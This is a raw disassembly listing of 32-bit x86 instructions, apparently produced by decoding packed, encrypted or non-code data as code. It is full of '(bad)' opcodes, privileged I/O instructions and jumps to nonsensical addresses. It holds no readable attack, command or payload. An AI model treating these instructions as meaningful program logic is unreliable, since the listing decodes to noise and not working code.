  425881:	in     al,0xc2
  425883:	ins    BYTE PTR es:[edi],dx
  425884:	dec    esp
  425885:	sub    eax,0xbe71148e
  42588a:	dec    eax
  42588b:	test   eax,0x69f5cbff
  425890:	dec    edx
  425891:	(bad)  
  425892:	pop    ebp
  425893:	scas   al,BYTE PTR es:[edi]
  425894:	fild   QWORD PTR [eax]
  425896:	ror    BYTE PTR ds:0x996eac2f,1
  42589c:	dec    esi
  42589d:	xchg   esp,eax
  42589e:	rol    BYTE PTR [ebx-0x5ef82d28],0x9e
  4258a5:	inc    eax
  4258a6:	(bad)  
  4258a7:	xor    ebx,DWORD PTR ds:0x9e2e8a64
  4258ad:	inc    ebp
  4258ae:	ins    BYTE PTR es:[edi],dx
  4258af:	ins    BYTE PTR es:[edi],dx
  4258b0:	push   ebx
  4258b1:	mov    esp,0x6910b541
  4258b6:	inc    edi
  4258b7:	inc    ebp
  4258b8:	xor    DWORD PTR [edx-0x59],ebx
  4258bb:	dec    eax
  4258bc:	xchg   esp,eax
  4258bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258be:	jno    0x425864
  4258c0:	cmp    eax,ecx
  4258c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258c3:	lock test DWORD PTR [eax-0xe],eax
  4258c7:	and    BYTE PTR ds:0x1aefafe2,bl
  4258cd:	repnz add BYTE PTR [eax],al
	...
  4258d8:	add    BYTE PTR [eax],al
  4258da:	dec    ebx
  4258db:	inc    ebp
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	jo     0x4258de
  4258e8:	mov    ds:0x1d06ce0,eax
  4258ed:	add    ah,bh
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    al,al
  4258f3:	pop    eax
  4258f4:	and    al,0x60
  4258f6:	dec    ecx
  4258f7:	jg     0x425881
  4258f9:	stos   DWORD PTR es:[edi],eax
  4258fa:	(bad)  
  4258fb:	push   ecx
  4258fc:	and    BYTE PTR [esi-0x8],dh
  4258ff:	lods   al,BYTE PTR ds:[esi]
  425900:	add    BYTE PTR [edi+0x44fe731d],ah
  425906:	fdiv   DWORD PTR [esi-0x48]
  425909:	stos   BYTE PTR es:[edi],al
  42590a:	push   ss
  42590b:	mov    ch,0x18
  42590d:	inc    edi
  42590e:	scas   al,BYTE PTR es:[edi]
  42590f:	dec    ecx
  425910:	(bad)  [ebx+0x69]
  425913:	pop    ecx
  425914:	inc    ebp
  425915:	cli    
  425916:	cmp    BYTE PTR [ecx],bh
  425918:	out    0x7f,al
  42591a:	mov    ah,0xc7
  42591c:	dec    esp
  42591d:	ja     0x425980
  42591f:	push   edi
  425920:	xchg   edi,eax
  425921:	scas   eax,DWORD PTR es:[edi]
  425922:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  425924:	inc    eax
  425925:	xor    DWORD PTR [ebx-0x46be1469],edi
  42592b:	int    0x65
  42592d:	in     ax,0x84
  425930:	cmp    eax,0x480f6566
  425935:	or     DWORD PTR [eax-0x1550e118],ebp
  42593b:	iret   
  42593c:	mov    ds:0xa55f5c76,al
  425941:	jg     0x425970
  425943:	adc    ebx,edx
  425945:	mov    ds:0x6b88c9a6,eax
  42594a:	(bad)  
  42594b:	sahf   
  42594c:	xchg   esp,eax
  42594d:	fidiv  DWORD PTR [edi+ebx*1-0x59]
  425951:	cmp    edx,0xc5d40503
  425957:	js     0x425937
  425959:	jne    0x425968
  42595b:	dec    esi
  42595c:	es xor dh,al
  42595f:	mov    bh,0xb4
  425961:	call   0x8c456115
  425966:	sbb    DWORD PTR [edi-0x53592f8c],edx
  42596c:	dec    eax
  42596d:	in     al,dx
  42596e:	icebp  
  42596f:	push   esi
  425970:	mov    bh,0x75
  425972:	mov    ebx,DWORD PTR [eax+ebp*4-0x21e83657]
  425979:	dec    edx
  42597b:	push   ecx
  42597c:	sbb    eax,0x8eeea047
  425981:	push   0x5e47f387
  425986:	cli    
  425987:	test   al,0x8e
  425989:	xor    DWORD PTR [edi+0x47d78de6],eax
  42598f:	cmp    DWORD PTR [edx+ebx*4-0x2f1f3f7c],edx
  425996:	out    0x37,eax
  425998:	out    0xb7,al
  42599a:	fwait
  42599b:	mov    ds:0x17128a23,al
  4259a0:	mov    eax,0xb8bc4c2e
  4259a5:	jmp    0xb8b2bccc
  4259aa:	xor    al,0xb1
  4259ac:	sahf   
  4259ad:	outs   dx,DWORD PTR ds:[esi]
  4259ae:	cmc    
  4259af:	retf   0x6510
  4259b2:	inc    eax
  4259b3:	mov    ah,0x50
  4259b5:	sub    DWORD PTR [ebx+0x19],0x4a452be2
  4259bc:	and    ch,BYTE PTR [edx-0x2ac50011]
  4259c2:	fidiv  WORD PTR [eax+0x864d6d]
  4259c8:	sub    al,0xed
  4259ca:	imul   ebp,DWORD PTR [ebx-0x50],0xffffffd1
  4259ce:	stc    
  4259cf:	lods   eax,DWORD PTR ds:[esi]
  4259d0:	xor    DWORD PTR [eax+0x76],ebx
  4259d3:	out    0x30,al
  4259d5:	mov    al,0xe7
  4259d7:	mov    ebp,0x93417df4
  4259dc:	dec    esp
  4259dd:	mov    esp,?
  4259df:	js     0x42599b
  4259e1:	jecxz  0x4259af
  4259e3:	mov    bl,0x8f
  4259e5:	cwde   
  4259e6:	arpl   WORD PTR [edi+edi*8+0x2c389b22],si
  4259ed:	pop    ds
  4259ee:	call   0xbe07:0x1b8face0
  4259f5:	hlt    
  4259f6:	(bad)  
  4259f7:	fcmovbe st,st(1)
  4259f9:	dec    eax
  4259fa:	xchg   ebp,eax
  4259fb:	inc    ebp
  4259fc:	and    ch,BYTE PTR [eax-0x4d]
  4259ff:	popf   
  425a00:	retf   
  425a01:	or     ah,BYTE PTR [edx+0x33080cb1]
  425a07:	xchg   esp,eax
  425a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a09:	jae    0x4259ad
  425a0b:	push   ecx
  425a0c:	cld    
  425a0d:	mov    al,ds:0xe041e499
  425a12:	jmp    0xf2a9b948
  425a17:	aad    0x11
  425a19:	pop    ss
  425a1a:	bound  edi,QWORD PTR [edi-0x56]
  425a1d:	jae    0x4259e6
  425a1f:	adc    eax,0xcc8361c2
  425a24:	fwait
  425a25:	repz mov ecx,DWORD PTR [ebx-0x48]
  425a29:	mov    al,BYTE PTR [esi-0x2c]
  425a2c:	fcmovnbe st,st(0)
  425a2e:	jne    0x4259fb
  425a30:	lock dec edi
  425a32:	je     0x425a56
  425a34:	xor    al,0x95
  425a36:	cdq    
  425a37:	std    
  425a38:	or     eax,0xf9251aad
  425a3d:	ins    DWORD PTR es:[edi],dx
  425a3e:	es sahf 
  425a40:	mov    ds:0x75ea9d7c,al
  425a45:	sbb    esp,DWORD PTR [esp+esi*2-0x7a]
  425a49:	cli    
  425a4a:	pop    esi
  425a4b:	repnz or al,0xd
  425a4e:	and    DWORD PTR [ebx+0x65],esi
  425a51:	jg     0x425a45
  425a53:	mov    ds:0x1d79a0,eax
  425a58:	push   edi
  425a59:	sbb    eax,esi
  425a5b:	jnp    0x425ada
  425a5d:	js     0x425a3d
  425a5f:	stos   BYTE PTR es:[edi],al
  425a60:	pop    DWORD PTR [ecx-0x7cd3b1b9]
  425a66:	(bad)  
  425a68:	stos   DWORD PTR es:[edi],eax
  425a69:	or     al,ch
  425a6b:	aad    0x9b
  425a6d:	ins    DWORD PTR es:[edi],dx
  425a6e:	and    al,BYTE PTR [ebx-0x8d361fd]
  425a74:	inc    edi
  425a75:	mov    bh,ch
  425a77:	lds    esi,FWORD PTR [ebp-0x50]
  425a7a:	addr16 (bad) 
  425a7c:	bnd jbe 0x425a4e
  425a7f:	leave  
  425a80:	aad    0x55
  425a82:	mov    ch,0x24
  425a84:	mov    WORD PTR [ebp+0x360bae48],?
  425a8a:	and    eax,0x1efe8aed
  425a8f:	push   eax
  425a90:	pop    ecx
  425a91:	in     al,dx
  425a92:	inc    esi
  425a93:	stc    
  425a94:	jmp    0xc1e26ddb
  425a99:	or     ah,dl
  425a9b:	push   ebp
  425a9c:	sti    
  425a9d:	jmp    0x6b9d03ca
  425aa2:	and    al,0x98
  425aa4:	pop    edi
  425aa5:	sub    edi,esi
  425aa7:	sti    
  425aa8:	je     0x425a51
  425aaa:	cmp    al,0x86
  425aac:	fs inc edx
  425aae:	pop    ss
  425aaf:	out    dx,eax
  425ab0:	in     al,dx
  425ab1:	jmp    0x465b:0xe27d1fc8
  425ab8:	sub    dh,BYTE PTR [edi]
  425aba:	scas   eax,DWORD PTR es:[edi]
  425abb:	mov    eax,ds:0xe112d8ab
  425ac0:	adc    al,0x6a
  425ac2:	push   eax
  425ac3:	sub    cl,dh
  425ac5:	mov    ah,0xd6
  425ac7:	mov    al,ds:0xdfb40f28
  425acc:	div    DWORD PTR [edi]
  425ace:	jne    0x425a7d
  425ad0:	mov    eax,ds:0x2cb06575
  425ad5:	and    ah,bh
  425ad7:	mov    al,0x6f
  425ad9:	retf   
  425ada:	stc    
  425adb:	push   0x27
  425add:	cdq    
  425ade:	je     0x425a77
  425ae0:	jle    0x425a79
  425ae2:	inc    esp
  425ae3:	adc    ah,BYTE PTR [ebp+0x3ed96df0]
  425ae9:	dec    ebx
  425aea:	les    edx,FWORD PTR [esi+0x176c]
	...
  425af8:	add    BYTE PTR [eax],al
  425afa:	stos   BYTE PTR es:[edi],al
  425afb:	jo     0x425add
  425afd:	dec    ecx
  425afe:	cli    
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	ins    DWORD PTR es:[edi],dx
  425b07:	or     al,0xcd
  425b09:	pop    ebp
  425b0a:	push   0xfc0001d2
  425b0f:	add    DWORD PTR [eax],eax
  425b11:	add    dh,dh
  425b13:	or     eax,0x77f7341
  425b18:	and    eax,0x2772a487
  425b1d:	loope  0x425b20
  425b1f:	mov    DWORD PTR ds:[eax],ebp
  425b22:	mov    ds:0xe0ee22aa,al
  425b27:	fldcw  WORD PTR [ebp+0x303068be]
  425b2d:	xor    al,0xd0
  425b2f:	pop    eax
  425b30:	les    edx,FWORD PTR [eax+0x3b]
  425b33:	ja     0x425b97
  425b35:	repnz mov DWORD PTR [ecx+esi*1+0x6a0e129c],0x3262d004
  425b41:	jno    0x425b0a
  425b43:	mov    ds:0x77c59ad1,al
  425b48:	lock adc BYTE PTR [esi+0x7a],bl
  425b4c:	jmp    0x425b64
  425b4e:	popf   
  425b4f:	sub    eax,0xa07960f2
  425b54:	mov    WORD PTR [edi+eax*1+0x52fa2e2a],?
  425b5b:	dec    edx
  425b5c:	xor    bl,ah
  425b5e:	mov    al,0x9b
  425b60:	enter  0x4006,0x41
  425b64:	stc    
  425b65:	repz mov ch,0x3a
  425b68:	mov    esi,0xe077d638
  425b6d:	pop    ds
  425b6e:	and    eax,0x17320406
  425b73:	push   edi
  425b74:	scas   al,BYTE PTR es:[edi]
  425b75:	lods   al,BYTE PTR ds:[esi]
  425b76:	mov    bh,dl
  425b78:	cwde   
  425b79:	sbb    edi,DWORD PTR [ebp-0x3f]
  425b7c:	jmp    0x425b9f
  425b7e:	lods   al,BYTE PTR ds:[esi]
  425b7f:	(bad)  
  425b80:	shl    BYTE PTR [eax+0x16],1
  425b83:	inc    ebp
  425b84:	loope  0x425bdb
  425b86:	adc    esi,eax
  425b88:	loope  0x425b3d
  425b8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b8b:	xchg   edi,eax
  425b8c:	(bad)  
  425b8d:	addr16 in eax,dx
  425b8f:	xor    al,0xfd
  425b91:	inc    ecx
  425b92:	pop    ecx
  425b93:	retf   0x25b9
  425b96:	adc    eax,0xe75e4a50
  425b9b:	out    dx,eax
  425b9c:	add    DWORD PTR [ebx+0x41],edx
  425b9f:	xchg   edi,eax
  425ba0:	pushf  
  425ba1:	inc    ecx
  425ba2:	pop    edx
  425ba3:	js     0x425bf8
  425ba5:	cs nop
  425ba7:	mov    ebx,0x467e2bbc
  425bac:	pop    ds
  425bad:	cdq    
  425bae:	imul   ecx,DWORD PTR [ecx],0x2ded1436
  425bb4:	(bad)  
  425bb5:	pop    esi
  425bb6:	dec    esp
  425bb7:	test   BYTE PTR [ebx+esi*1],ch
  425bba:	push   0x23
  425bbc:	jbe    0x425bf3
  425bbe:	js     0x425bd0
  425bc0:	mov    ds:0xb6a80910,al
  425bc5:	inc    eax
  425bc6:	pop    eax
  425bc7:	pusha  
  425bc8:	popf   
  425bc9:	or     BYTE PTR [edi-0x1b4c8a97],bh
  425bcf:	fsub   QWORD PTR [eax+edx*8]
  425bd2:	ret    0x8222
  425bd5:	dec    ebp
  425bd6:	in     al,0x6
  425bd8:	push   eax
  425bd9:	xchg   ebp,eax
  425bda:	out    dx,eax
  425bdb:	(bad)  
  425bdd:	jno    0x425c51
  425bdf:	jo     0x425bbd
  425be1:	shr    DWORD PTR [eax+ebx*8+0x6802dcb9],cl
  425be8:	jp     0x425bb0
  425bea:	int3   
  425beb:	lds    eax,FWORD PTR [eax]
  425bed:	loope  0x425ba1
  425bef:	jbe    0x425b96
  425bf1:	xor    ebp,edx
  425bf3:	iret   
  425bf4:	mov    cl,0x70
  425bf6:	out    dx,eax
  425bf7:	mov    esp,0xf20108dc
  425bfc:	push   ecx
  425bfd:	das    
  425bfe:	ret    0x35cb
  425c01:	inc    ebp
  425c02:	or     eax,DWORD PTR ds:0xa89d07ca
  425c08:	cmc    
  425c09:	pushf  
  425c0a:	push   ebx
  425c0b:	and    DWORD PTR [edx-0x7c6d5dfa],0xffffff82
  425c12:	je     0x425c51
  425c14:	test   al,0x4d
  425c16:	pop    esp
  425c17:	jecxz  0x425c22
  425c19:	sbb    al,0x71
  425c1b:	jo     0x425c4d
  425c1d:	invd   
  425c1f:	stos   DWORD PTR es:[edi],eax
  425c20:	shl    BYTE PTR [ebp+0x5d],1
  425c23:	stos   BYTE PTR es:[edi],al
  425c24:	xchg   esp,eax
  425c25:	(bad)  
  425c26:	ss aaa 
  425c28:	das    
  425c29:	aas    
  425c2a:	push   0xffffff84
  425c2c:	lock cmc 
  425c2e:	xchg   esp,eax
  425c2f:	stc    
  425c30:	stos   BYTE PTR es:[edi],al
  425c31:	mov    edi,0x1729cf7b
  425c36:	sub    eax,0xdbc95c87
  425c3b:	mov    DWORD PTR [edi+0x48],eax
  425c3e:	pop    esp
  425c3f:	jecxz  0x425cbe
  425c41:	cwde   
  425c42:	jns    0x425bda
  425c44:	cmp    eax,0xb162967e
  425c49:	sbb    BYTE PTR [edx+0x1d1974a],dl
  425c4f:	pop    ds
  425c50:	repnz pop edi
  425c52:	ret    0x66a2
  425c55:	jne    0x425c50
  425c57:	imul   edx,DWORD PTR [edi-0x472baa86],0x390f28b3
  425c61:	adc    ah,BYTE PTR [edi-0x25]
  425c64:	mov    ds:0x452dae59,al
  425c69:	aas    
  425c6a:	add    BYTE PTR [edx],0x59
  425c6d:	jmp    0xa5812b3a
  425c72:	out    0xb7,al
  425c74:	dec    edi
  425c75:	mov    bl,0x85
  425c77:	and    eax,0x927b2c53
  425c7c:	shl    eax,0xe5
  425c7f:	invd   
  425c81:	and    ah,0x73
  425c84:	add    al,bh
  425c86:	sti    
  425c87:	push   0xe70fd673
  425c8c:	bound  ebx,QWORD PTR [ebx-0x40]
  425c8f:	call   0x67b4731d
  425c94:	out    dx,eax
  425c95:	xor    BYTE PTR [eax+0x3c],0xba
  425c99:	dec    esi
  425c9a:	xor    edi,esi
  425c9c:	aad    0x5f
  425c9e:	mov    bh,BYTE PTR [edi+0x45]
  425ca1:	and    ch,bl
  425ca3:	mov    ecx,DWORD PTR [edi+edx*1]
  425ca6:	pop    eax
  425ca7:	retf   
  425ca8:	outs   dx,BYTE PTR ds:[esi]
  425ca9:	gs je  0x425d20
  425cac:	not    eax
  425cae:	sub    al,0xb7
  425cb0:	pop    ds
  425cb1:	pop    ebp
  425cb2:	inc    esi
  425cb3:	fs lahf 
  425cb5:	retf   0xdd2d
  425cb8:	fistp  WORD PTR [edx-0x65]
  425cbb:	jb     0x425c47
  425cbd:	ret    
  425cbe:	in     al,dx
  425cbf:	adc    bh,BYTE PTR [esi-0x2f]
  425cc2:	mov    BYTE PTR [esi],al
  425cc4:	sub    eax,0x54f1eb6f
  425cc9:	cli    
  425cca:	push   ds
  425ccb:	addr16 pop ebx
  425ccd:	hlt    
  425cce:	sbb    DWORD PTR [edi+0x4e],eax
  425cd1:	mov    DWORD PTR [edi-0x69],edx
  425cd4:	(bad)  
  425cd5:	nop
  425cd6:	sbb    cl,cl
  425cd8:	jmp    0x425d24
  425cda:	xor    dl,ch
  425cdc:	call   0x9551c9c4
  425ce1:	mov    cs,WORD PTR cs:[esi]
  425ce4:	xchg   DWORD PTR [ecx],ecx
  425ce6:	pop    ss
  425ce7:	lods   al,BYTE PTR ds:[esi]
  425ce8:	mov    cl,0xc2
  425cea:	outs   dx,BYTE PTR ds:[esi]
  425ceb:	mov    ebx,0x1395f146
  425cf0:	dec    eax
  425cf2:	mov    ah,0x2c
  425cf4:	pop    esp
  425cf5:	xchg   esi,eax
  425cf6:	pop    eax
  425cf7:	retf   0x8314
  425cfa:	mov    ecx,0x4bbaf362
  425cff:	lock dec ebx
  425d01:	jno    0x425d38
  425d03:	out    0xf,al
  425d05:	in     eax,dx
  425d06:	jmp    DWORD PTR [ecx]
  425d08:	add    esi,DWORD PTR ds:0x73a709b5
	...
  425d1a:	dec    edx
  425d1b:	xchg   DWORD PTR [edx+0x4c],edx
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi-0x2f92def1],ecx
  425d27:	outs   dx,BYTE PTR ds:[esi]
  425d28:	dec    eax
  425d29:	lock fs aam 0x1
  425d2d:	add    ah,bh
  425d2f:	add    DWORD PTR [eax],eax
  425d31:	add    BYTE PTR [ebx+0x560c2335],dh
  425d37:	add    bl,BYTE PTR [eax]
  425d39:	fsincos 
  425d3b:	aam    0x38
  425d3d:	pop    esp
  425d3e:	stos   DWORD PTR es:[edi],eax
  425d3f:	and    DWORD PTR [ebx+0x42],esi
  425d42:	sub    esp,edx
  425d44:	out    dx,al
  425d45:	sbb    dh,bl
  425d47:	mov    ebp,0x27aae841
  425d4c:	cmc    
  425d4d:	jmp    0x425cf6
  425d4f:	xchg   DWORD PTR [eax+0x64],esi
  425d52:	mov    dh,0x7d
  425d54:	dec    edi
  425d55:	push   edx
  425d56:	push   esp
  425d57:	(bad)  
  425d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d59:	ins    DWORD PTR es:[edi],dx
  425d5a:	xor    eax,0xaf8f6a99
  425d5f:	or     al,0x37
  425d61:	sbb    eax,0x46f79484
  425d66:	jns    0x425dd2
  425d68:	push   eax
  425d69:	stos   DWORD PTR es:[edi],eax
  425d6a:	leave  
  425d6b:	mov    ecx,0x62aa33b5
  425d70:	mov    ecx,ds
  425d72:	into   
  425d73:	mov    eax,ds:0xbc6b6c73
  425d78:	pushf  
  425d79:	push   ds
  425d7a:	xor    DWORD PTR [ebp+0xe],edi
  425d7d:	cdq    
  425d7e:	lock or al,BYTE PTR [edx]
  425d81:	into   
  425d82:	scas   eax,DWORD PTR es:[edi]
  425d83:	sahf   
  425d84:	xchg   ecx,eax
  425d85:	(bad)  [eax+0x27]
  425d88:	sub    esp,esp
  425d8a:	out    0xb6,al
  425d8c:	bound  edx,QWORD PTR [ecx+0xbbe85e1]
  425d92:	(bad)  
  425d93:	fisubr DWORD PTR ds:0xc7baa545
  425d99:	es into 
  425d9b:	sbb    dl,bh
  425d9d:	test   eax,0x11c3cde8
  425da2:	xor    eax,0x7a06f4b3
  425da7:	push   ebp
  425da8:	xor    al,0xad
  425daa:	pop    eax
  425dab:	lods   eax,DWORD PTR ds:[esi]
  425dac:	fisttp DWORD PTR [edi+eiz*4]
  425daf:	lock inc ebp
  425db1:	pushf  
  425db2:	push   ebx
  425db3:	xchg   edi,eax
  425db4:	sahf   
  425db5:	sub    bl,BYTE PTR [ebp-0x2d]
  425db8:	cmp    eax,0x58a7c31a
  425dbd:	stos   DWORD PTR es:[edi],eax
  425dbe:	push   esi
  425dbf:	xchg   edi,eax
  425dc0:	push   cs
  425dc1:	(bad)  
  425dc2:	cdq    
  425dc3:	push   esp
  425dc4:	sub    BYTE PTR [edi+0x57],dh
  425dc7:	xchg   esp,eax
  425dc8:	adc    DWORD PTR [edx],esi
  425dca:	rol    bl,cl
  425dcc:	inc    ecx
  425dcd:	sub    al,0x89
  425dcf:	jb     0x425dfe
  425dd1:	mov    bl,0x6c
  425dd3:	fdiv   QWORD PTR [edi+0x1e47d471]
  425dd9:	adc    al,0xe
  425ddb:	inc    esi
  425ddc:	mov    al,ds:0x607a42d1
  425de1:	inc    edi
  425de2:	cdq    
  425de3:	imul   ecx,DWORD PTR [edx-0x68358ac6],0xc09c9326
  425ded:	jmp    0x4c2bb174
  425df2:	add    edi,0xffffff98
  425df5:	jmp    0x771fa3a2
  425dfa:	aaa    
  425dfb:	mov    esi,0x55b3a23b
  425e00:	mov    es,edx
  425e02:	lahf   
  425e03:	loopne 0x425e13
  425e05:	push   0xb77ff142
  425e0a:	jns    0x425e66
  425e0c:	int    0x5
  425e0e:	cmp    BYTE PTR [esi-0x1c18341],ch
  425e14:	or     BYTE PTR [edi],bh
  425e16:	inc    ebp
  425e17:	fldenv [ebx-0x2f]
  425e1a:	dec    edx
  425e1b:	or     al,0xd0
  425e1d:	inc    eax
  425e1e:	lods   eax,DWORD PTR ds:[esi]
  425e1f:	push   ss
  425e20:	jge    0x425e34
  425e22:	std    
  425e23:	mov    eax,0xae3736eb
  425e28:	retf   
  425e29:	inc    ecx
  425e2a:	outs   dx,BYTE PTR ds:[esi]
  425e2b:	xchg   DWORD PTR ds:0x5a5a9b6e,ebx
  425e31:	div    DWORD PTR [edx-0x5e646dee]
  425e37:	daa    
  425e38:	enter  0x446b,0x67
  425e3c:	(bad)  [ebp-0x3e]
  425e3f:	imul   eax,DWORD PTR [edi-0x7a7327d6],0x60
  425e46:	cdq    
  425e47:	dec    ecx
  425e48:	fisttp WORD PTR [edx+0x1c651757]
  425e4e:	enter  0x83f6,0xef
  425e52:	dec    esp
  425e53:	sti    
  425e54:	sbb    al,0x66
  425e56:	popa   
  425e57:	adc    eax,0x803ac73b
  425e5c:	arpl   WORD PTR [ebp+0x3f],si
  425e5f:	leave  
  425e60:	cmp    ebp,DWORD PTR ds:0x3c99a856
  425e66:	out    0xa4,eax
  425e68:	dec    ebx
  425e69:	sbb    BYTE PTR [esi+0x6682fd01],dl
  425e6f:	(bad)  
  425e70:	(bad)  
  425e71:	ficomp WORD PTR [ecx]
  425e73:	aam    0x73
  425e75:	daa    
  425e76:	lock leave 
  425e78:	arpl   si,di
  425e7a:	in     al,dx
  425e7b:	mov    al,ds:0x1a5a9a74
  425e80:	std    
  425e81:	js     0x425efc
  425e83:	mov    dh,0xc7
  425e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e86:	mov    DWORD PTR [ebp+0x49],ebp
  425e89:	adc    BYTE PTR [eax-0x49033149],al
  425e8f:	push   esi
  425e90:	adc    DWORD PTR [edi+0x71],edx
  425e93:	or     DWORD PTR [ebp+0x51a94e2d],edi
  425e99:	mov    ebx,0x34769579
  425e9e:	push   esp
  425e9f:	push   ebx
  425ea0:	push   esi
  425ea1:	fld    QWORD PTR [ecx+0xa]
  425ea4:	stos   BYTE PTR es:[edi],al
  425ea5:	icebp  
  425ea6:	push   0x4d
  425ea8:	mov    BYTE PTR [edx+0x1833f9b4],al
  425eae:	and    edx,DWORD PTR [edx+0x7dabd122]
  425eb4:	ds inc ebx
  425eb6:	or     DWORD PTR [esi],ebp
  425eb8:	mov    edx,0xe58bd3f9
  425ebd:	ret    
  425ebe:	rcr    bh,0xc4
  425ec1:	cmp    esp,esi
  425ec3:	xchg   ecx,ebp
  425ec5:	sahf   
  425ec6:	leave  
  425ec7:	dec    edx
  425ec8:	je     0x425f02
  425eca:	mov    bl,0xb9
  425ecc:	ja     0x425ee9
  425ece:	iret   
  425ecf:	mov    dh,0x3b
  425ed1:	cmc    
  425ed2:	and    ch,BYTE PTR [eax-0x4b6fb6d0]
  425ed8:	cs mov ebx,0x6c6307c8
  425ede:	ins    BYTE PTR es:[edi],dx
  425edf:	sbb    al,BYTE PTR [edi-0x5fbd2a07]
  425ee5:	push   ebx
  425ee6:	and    BYTE PTR [edx-0x61],ah
  425ee9:	aas    
  425eea:	sub    al,0xfe
  425eec:	ds pop ecx
  425eee:	pop    edx
  425eef:	push   eax
  425ef0:	loopne 0x425e8e
  425ef2:	fistp  QWORD PTR [eax+0x0]
  425ef5:	jmp    0x425f02
  425ef7:	dec    edi
  425ef8:	xor    esi,edx
  425efa:	sahf   
  425efb:	cli    
  425efc:	popf   
  425efd:	mov    bl,0x52
  425eff:	aas    
  425f00:	bound  edi,QWORD PTR [edx]
  425f02:	sbb    BYTE PTR [ebx],bh
  425f04:	jp     0x425f5f
  425f06:	add    esp,DWORD PTR [edx+edx*2]
  425f09:	xor    al,0x95
  425f0b:	prefetcht2 BYTE PTR [eax]
  425f0e:	push   ecx
  425f0f:	jns    0x425ead
  425f11:	push   es
  425f12:	dec    eax
  425f13:	mov    dl,0xcd
  425f15:	fxch   st(1)
  425f17:	jmp    0x425f5e
  425f19:	push   edx
  425f1a:	mov    ds:0xfc4ec523,eax
  425f1f:	fistp  WORD PTR [edi-0x65235b4a]
  425f25:	cmp    esi,DWORD PTR [esi]
  425f27:	cmp    eax,0x10d1c017
  425f2c:	jne    0x425eda
	...
  425f3a:	or     dl,BYTE PTR [edx-0x3c684]
  425f40:	dec    edi
  425f41:	mov    bl,0x9
  425f43:	sub    al,0x0
  425f45:	sub    esp,DWORD PTR [edi-0x41]
  425f48:	pop    ebx
  425f49:	ret    0xd660
  425f4c:	add    DWORD PTR [eax],eax
  425f4e:	cld    
  425f4f:	add    DWORD PTR [eax],eax
  425f51:	add    BYTE PTR [eax-0x1f],ah
  425f54:	addr16 repnz sahf 
  425f57:	push   ebp
  425f58:	push   0xccd5158d
  425f5d:	mov    bh,0xfc
  425f5f:	jecxz  0x425f87
  425f61:	push   ds
  425f62:	push   ebx
  425f63:	jle    0x425f4d
  425f65:	xor    eax,0x7a7db4c6
  425f6a:	and    ch,BYTE PTR [edx]
  425f6c:	jb     0x425fc7
  425f6e:	push   es
  425f6f:	lods   eax,DWORD PTR ds:[esi]
  425f70:	mov    al,0x1b
  425f72:	push   ds
  425f73:	ins    DWORD PTR es:[edi],dx
  425f74:	jb     0x425fe9
  425f76:	test   BYTE PTR [eax],ch
  425f78:	inc    esi
  425f79:	xchg   esp,eax
  425f7a:	mov    bl,0x28
  425f7c:	in     eax,dx
  425f7d:	mov    dl,0xd3
  425f7f:	in     eax,dx
  425f80:	mov    ebx,0xcdd40119
  425f85:	jbe    0x425fde
  425f87:	push   ebp
  425f88:	add    DWORD PTR [edi+edi*2-0x42045952],0xffffffa0
  425f90:	clc    
  425f91:	outs   dx,DWORD PTR ds:[esi]
  425f92:	inc    BYTE PTR [edi-0x64]
  425f95:	and    DWORD PTR [edx+0x7ee12ba6],0x6
  425f9c:	into   
  425f9d:	rcr    BYTE PTR [ebx],1
  425f9f:	in     al,0x96
  425fa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fa2:	pop    ds
  425fa3:	std    
  425fa4:	in     eax,dx
  425fa5:	rcl    BYTE PTR [ecx+esi*2+0xc1e1b42],1
  425fac:	out    dx,eax
  425fad:	fdivr  QWORD PTR [ecx-0x19]
  425fb0:	imul   edi,esp,0xffffffdd
  425fb3:	push   edx
  425fb4:	push   0x727037cc
  425fb9:	in     al,dx
  425fba:	cs inc sp
  425fbd:	arpl   WORD PTR [esi],dx
  425fbf:	mov    bh,0xd3
  425fc1:	jns    0x425ffe
  425fc3:	repz or BYTE PTR [esi],0x6a
  425fc7:	inc    ecx
  425fc8:	imul   edx,DWORD PTR [ebx],0x29
  425fcb:	jle    0x425fde
  425fcd:	mov    dh,0x88
  425fcf:	out    dx,eax
  425fd0:	data16 jne 0x425f91
  425fd3:	and    BYTE PTR [ebx+0x4c],0x2e
  425fd7:	mov    cl,0x24
  425fd9:	sub    ebp,DWORD PTR [edx-0x2a9645b8]
  425fdf:	std    
  425fe0:	out    0x55,al
  425fe2:	jno    0x425fba
  425fe4:	or     al,0x32
  425fe6:	push   0x7c
  425fe8:	addr16 sub eax,0x52ca43ce
  425fee:	push   ecx
  425fef:	icebp  
  425ff0:	int3   
  425ff1:	inc    ebx
  425ff2:	mov    dh,0xee
  425ff4:	or     al,dh
  425ff6:	scas   al,BYTE PTR es:[edi]
  425ff7:	pandn  mm1,QWORD PTR [ebp-0x52]
  425ffb:	adc    BYTE PTR [ebp-0x63],al
  425ffe:	clc    
  425fff:	add    ah,BYTE PTR [edi+eax*2-0x34]
  426003:	or     al,bl
  426005:	xor    ch,BYTE PTR [edx+0x46]
  426008:	sahf   
  426009:	std    
  42600a:	outs   dx,DWORD PTR ds:[esi]
  42600b:	adc    al,0xf3
  42600d:	fldcw  WORD PTR [esi]
  42600f:	push   ebp
  426010:	fwait
  426011:	aad    0x54
  426013:	call   0xf9ca:0x632b2d8
  42601a:	mov    cs,WORD PTR [eax+0x309b6a57]
  426020:	repnz shl BYTE PTR [edi+0x5d],0x5e
  426025:	cmp    cl,BYTE PTR [edx-0x4f5f8bf2]
  42602b:	mov    bh,0xd3
  42602d:	aad    0x6e
  42602f:	outs   dx,DWORD PTR ds:[esi]
  426030:	inc    esi
  426031:	fist   DWORD PTR [edx+0x21]
  426034:	clc    
  426035:	gs (bad) 
